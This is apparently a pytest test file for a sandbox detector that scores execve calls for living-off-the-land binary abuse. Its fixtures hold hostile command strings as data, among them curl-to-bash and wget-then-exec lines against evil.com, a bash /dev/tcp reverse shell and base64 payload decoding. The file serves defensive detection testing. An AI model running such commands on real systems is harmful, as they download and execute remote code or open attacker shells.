"""Unit tests — H7 LOLBins hypothesis.

Three fixture categories:
  - Legitimate (low score / value=False)
  - Suspicious (intermediate score / value=True)
  - Malicious  (high score / value=True)

Run: pytest apps/workers/sandbox_layer/agent/tests/test_lolbins.py -v
"""

from __future__ import annotations

import sys
from pathlib import Path

# Allow local imports without installing the package
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest

from models import (
    MemoryObservables,
    NetworkObservables,
    RuntimeSignals,
    SnapshotDiff,
    SyscallSummary,
)
from hypotheses.lolbins import evaluate


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_signals(execve_args: list[str]) -> RuntimeSignals:
    """Build a minimal RuntimeSignals with one aggregated execve summary."""
    syscalls = []
    if execve_args:
        syscalls.append(SyscallSummary(
            name="execve",
            call_count=len(execve_args),
            unique_pids=[1234],
            sample_args=execve_args,
        ))
    return RuntimeSignals(
        syscalls_summary=syscalls,
        inotify_events=[],
        network=NetworkObservables(),
        execution_duration_s=5.0,
        sleep_cumulated_s=0.0,
        exit_code=0,
    )


def _make_empty_diff() -> SnapshotDiff:
    return SnapshotDiff(
        execution_duration_s=5.0,
        file_diffs=[],
        files_created_count=0,
        files_modified_count=0,
        files_deleted_count=0,
        processes_spawned=[],
        processes_terminated=[],
        sockets_opened=[],
        sockets_closed=[],
        crontab_additions=[],
        crontab_deletions=[],
        systemd_additions=[],
        persistence_changes=[],
    )


_DIFF = _make_empty_diff()
_MEM = MemoryObservables()


# ---------------------------------------------------------------------------
# Tests — legitimate binary / no LOLBin
# ---------------------------------------------------------------------------

def test_no_execve_returns_false():
    """No execve -> score = 0, value = False."""
    signals = RuntimeSignals(
        syscalls_summary=[],
        inotify_events=[],
        network=NetworkObservables(),
        execution_duration_s=2.0,
        sleep_cumulated_s=0.0,
        exit_code=0,
    )
    result = evaluate(_DIFF, signals, _MEM)
    assert result.value is False
    assert result.score == 0.0
    assert result.evidence == []


def test_non_lolbin_execve_returns_false():
    """Non-LOLBin binaries (ls, grep) -> score = 0."""
    signals = _make_signals([
        '"/usr/bin/ls", ["ls", "-la", "/tmp"], NULL',
        '"/usr/bin/grep", ["grep", "pattern", "file"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    assert result.value is False
    assert result.score == 0.0


def test_curl_without_suspicious_args_low_score():
    """curl alone (no URL, no pipe) -> weak signal (LOLBin presence only)."""
    signals = _make_signals([
        '"/usr/bin/curl", ["curl", "--version"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    # Weak signal: depends on threshold (0.25), curl alone = 0.10
    assert result.score == pytest.approx(0.10, abs=0.01)
    assert result.value is False  # score < 0.25


# ---------------------------------------------------------------------------
# Tests — suspicious patterns
# ---------------------------------------------------------------------------

def test_curl_with_url_triggers():
    """curl with URL -> moderate signal, value=True."""
    signals = _make_signals([
        '"/usr/bin/curl", ["curl", "-s", "http://evil.example.com/payload"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    assert result.value is True
    assert result.score >= 0.25
    assert any("URL in execve args" in e.value for e in result.evidence)


def test_python_inline_payload():
    """python3 -c with subshell -> suspicious."""
    signals = _make_signals([
        '"/usr/bin/python3", ["python3", "-c", "import os; os.system($(id))"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    assert result.value is True
    assert result.score >= 0.25


def test_base64_decode_pipeline():
    """base64 -d -> classic payload decode pattern."""
    signals = _make_signals([
        '"/usr/bin/base64", ["base64", "-d", "encoded_payload"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    assert result.value is True
    assert result.score >= 0.25
    assert any("base64" in e.value.lower() for e in result.evidence)


# ---------------------------------------------------------------------------
# Tests — malicious patterns with high score
# ---------------------------------------------------------------------------

def test_download_pipe_to_shell_high_score():
    """curl | bash -> the most classic staging pattern, high score."""
    signals = _make_signals([
        '"/usr/bin/bash", ["bash", "-c", "curl http://evil.com/x | bash"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    assert result.value is True
    assert result.score >= 0.50
    assert any("download|pipe-to-shell" in e.value for e in result.evidence)


def test_dev_tcp_reverse_shell():
    """/dev/tcp reverse shell via bash."""
    signals = _make_signals([
        '"/bin/bash", ["bash", "-i", ">& /dev/tcp/10.0.0.1/4444 0>&1"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    assert result.value is True
    assert result.score >= 0.50
    assert any("/dev/tcp/" in e.value for e in result.evidence)


def test_multiple_lolbins_accumulates_score():
    """Multiple distinct LOLBins -> cumulative score."""
    signals = _make_signals([
        '"/usr/bin/wget", ["wget", "http://evil.com/dropper", "-O", "/tmp/x"], NULL',
        '"/usr/bin/base64", ["base64", "-d", "/tmp/encoded"], NULL',
        '"/bin/bash", ["bash", "-c", "exec /tmp/x"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    assert result.value is True
    # Multiple patterns -> higher score than a single one
    assert result.score >= 0.40


# ---------------------------------------------------------------------------
# Tests — evidence traceability
# ---------------------------------------------------------------------------

def test_evidence_points_to_execve():
    """Each evidence must point to syscalls_summary[execve]."""
    signals = _make_signals([
        '"/usr/bin/curl", ["curl", "https://evil.com/c2"], NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    for ev in result.evidence:
        assert ev.source == "runtime_signals"
        assert "execve" in ev.field_path


def test_score_capped_at_one():
    """Score is capped at 1.0 even with many positive signals."""
    signals = _make_signals([
        '"/bin/bash", ["bash", "-c", "curl https://evil.com/x | bash"], NULL',
        '"/usr/bin/wget", ["wget", "https://evil.com/y | sh"], NULL',
        '"/usr/bin/python3", ["python3", "-c", "curl https://a.com | bash"], NULL',
        '"/usr/bin/base64", ["base64", "-d", "payload"], NULL',
        '"/dev/tcp/127.0.0.1/1234", NULL',
    ])
    result = evaluate(_DIFF, signals, _MEM)
    assert result.score <= 1.0
